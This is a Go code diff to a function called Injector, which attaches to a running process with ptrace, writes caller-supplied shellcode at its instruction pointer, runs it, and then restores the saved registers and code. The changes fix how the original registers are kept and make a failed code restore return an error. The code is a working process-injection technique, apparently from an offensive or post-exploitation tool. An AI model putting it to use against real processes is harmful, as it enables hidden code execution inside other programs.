@@ -153,12 +153,12 @@ func Injector(shellcode *string, pid int) error {
 	}
 
 	// read RIP
-	regs := &syscall.PtraceRegs{}
-	err = syscall.PtraceGetRegs(pid, regs)
+	origRegs := &syscall.PtraceRegs{}
+	err = syscall.PtraceGetRegs(pid, origRegs)
 	if err != nil {
 		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
 	}
-	origRip := regs.Rip
+	origRip := origRegs.Rip
 	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
 
 	// save current code for restoring later
@@ -187,7 +187,7 @@ func Injector(shellcode *string, pid int) error {
 	if err != nil {
 		return fmt.Errorf("PEEK: 0x%x", origRip)
 	}
-	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, origRip)
+	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
 
 	// continue and wait
 	err = syscall.PtraceCont(pid, 0)
@@ -205,28 +205,29 @@ func Injector(shellcode *string, pid int) error {
 	case ws.Continued():
 		return nil
 	case ws.CoreDump():
-		err = syscall.PtraceGetRegs(pid, regs)
+		err = syscall.PtraceGetRegs(pid, origRegs)
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
+		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
 	case ws.Exited():
 		return nil
 	case ws.Signaled():
-		err = syscall.PtraceGetRegs(pid, regs)
+		err = syscall.PtraceGetRegs(pid, origRegs)
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
 	case ws.Stopped():
-		err = syscall.PtraceGetRegs(pid, regs)
+		stoppedRegs := &syscall.PtraceRegs{}
+		err = syscall.PtraceGetRegs(pid, stoppedRegs)
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
+		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
 
 		// restore registers
-		err = syscall.PtraceSetRegs(pid, regs)
+		err = syscall.PtraceSetRegs(pid, origRegs)
 		if err != nil {
 			return fmt.Errorf("Restoring process: set regs: %v", err)
 		}
@@ -234,9 +235,7 @@ func Injector(shellcode *string, pid int) error {
 		// breakpoint hit, restore the process
 		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
 		if err != nil {
-			// return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
-			// FIXME unable to restore process, we have to ignore this error
-			log.Printf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
 		}
 		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
 
@@ -252,11 +251,11 @@ func Injector(shellcode *string, pid int) error {
 
 		return nil
 	default:
-		err = syscall.PtraceGetRegs(pid, regs)
+		err = syscall.PtraceGetRegs(pid, origRegs)
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("continue: RIP at 0x%x", regs.Rip)
+		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
 	}
 
 	return nil
